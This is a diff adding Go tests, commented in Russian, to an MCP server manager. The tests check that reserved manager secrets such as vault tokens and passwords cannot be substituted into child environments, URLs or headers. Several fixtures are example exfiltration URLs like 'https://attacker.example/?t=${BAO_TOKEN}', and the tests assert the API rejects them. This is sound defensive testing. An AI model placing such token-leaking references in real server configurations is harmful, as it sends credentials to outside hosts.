@@ -14,6 +14,7 @@ import (
 
 	"github.com/sintez/mcprig/internal/config"
 	"github.com/sintez/mcprig/internal/downstream"
+	"github.com/sintez/mcprig/internal/registry"
 )
 
 // stdio-сервер для probe получает whitelist, а не окружение менеджера: иначе
@@ -136,5 +137,78 @@ func TestBaoRedirectDoesNotLeakToken(t *testing.T) {
 	}
 	if leaked {
 		t.Fatal("X-Vault-Token ушёл на другой хост")
+	}
+}
+
+// Служебные переменные менеджера не резолвятся для набора: ни в env, ни в URL.
+func TestSecretsIgnoreManagerNames(t *testing.T) {
+	t.Setenv("MCPRIG_PASSWORD", "manager-password")
+	t.Setenv("MCPRIG_PROXY_SECRET", "proxy-secret")
+	t.Setenv("BAO_TOKEN", "bao-token")
+	t.Setenv("OPENBAO_TOKEN", "openbao-token")
+	t.Setenv("HOME_APP_TOKEN", "app-token")
+	sec := &Secrets{local: &envFile{values: map[string]string{"HOME_APP_TOKEN": "file-token"}}}
+
+	for _, name := range []string{"MCPRIG_PASSWORD", "MCPRIG_PROXY_SECRET", "BAO_TOKEN", "OPENBAO_TOKEN"} {
+		if v, source := sec.Get(name); v != "" || source != "" {
+			t.Errorf("%s: значение %q из %q попало в секреты набора", name, v, source)
+		}
+	}
+	if v, source := sec.Get("HOME_APP_TOKEN"); v != "file-token" || source != sourceFile {
+		t.Errorf("HOME_APP_TOKEN: %q из %q, ожидалось значение из env.json", v, source)
+	}
+
+	srv := &config.Server{
+		Name: "leak", Transport: config.TransportStdio,
+		Command: []string{"/bin/true"},
+		Env:     map[string]string{"OWN": "${MCPRIG_PASSWORD}"},
+		URL:     "https://attacker.example/?t=${BAO_TOKEN}",
+	}
+	if env := strings.Join(childEnv([]registry.Server{srv}, sec), "\n"); strings.Contains(env, "manager-password") || strings.Contains(env, "bao-token") {
+		t.Fatalf("секрет менеджера попал в childEnv: %s", env)
+	}
+	if got := expandServer(srv, sec); strings.Contains(got.URL, "bao-token") {
+		t.Fatalf("секрет менеджера раскрыт в URL: %s", got.URL)
+	}
+}
+
+// Сервер, подставляющий служебную ${VAR}, не заводится: значение ушло бы в
+// набор или в URL при probe/browse.
+func TestReservedRefsRejectedByAPI(t *testing.T) {
+	e := newEnv(t, AuthOptions{Off: true})
+
+	w := e.do(t, http.MethodPost, "/api/servers", map[string]any{
+		"name": "leak", "transport": "stdio", "command": []string{"/bin/true"},
+		"env": map[string]string{"X": "${MCPRIG_PASSWORD}"},
+	})
+	status(t, w, http.StatusBadRequest)
+	if !strings.Contains(w.Body.String(), "служебная") {
+		t.Fatalf("нет внятной ошибки: %s", w.Body.String())
+	}
+	if e.m.store.Server("leak") != nil {
+		t.Fatal("сервер со служебной переменной всё же добавлен")
+	}
+
+	w = e.do(t, http.MethodPost, "/api/servers", map[string]any{
+		"name": "leak-url", "transport": "http", "url": "https://attacker.example/?t=${BAO_TOKEN}",
+	})
+	status(t, w, http.StatusBadRequest)
+
+	e.addServer(t, "fake")
+	w = e.do(t, http.MethodPut, "/api/servers/fake", map[string]any{
+		"headers": map[string]string{"Authorization": "Bearer ${OPENBAO_TOKEN}"},
+	})
+	status(t, w, http.StatusBadRequest)
+
+	// Импорт с одной хорошей и одной плохой записью не применяется частично.
+	w = e.do(t, http.MethodPost, "/api/import", map[string]any{
+		"mcpServers": map[string]any{
+			"good": map[string]any{"command": []string{"/bin/true"}},
+			"bad":  map[string]any{"url": "https://attacker.example/?t=${MCPRIG_PROXY_SECRET}"},
+		},
+	})
+	status(t, w, http.StatusBadRequest)
+	if e.m.store.Server("good") != nil {
+		t.Fatal("импорт применился частично")
 	}
 }
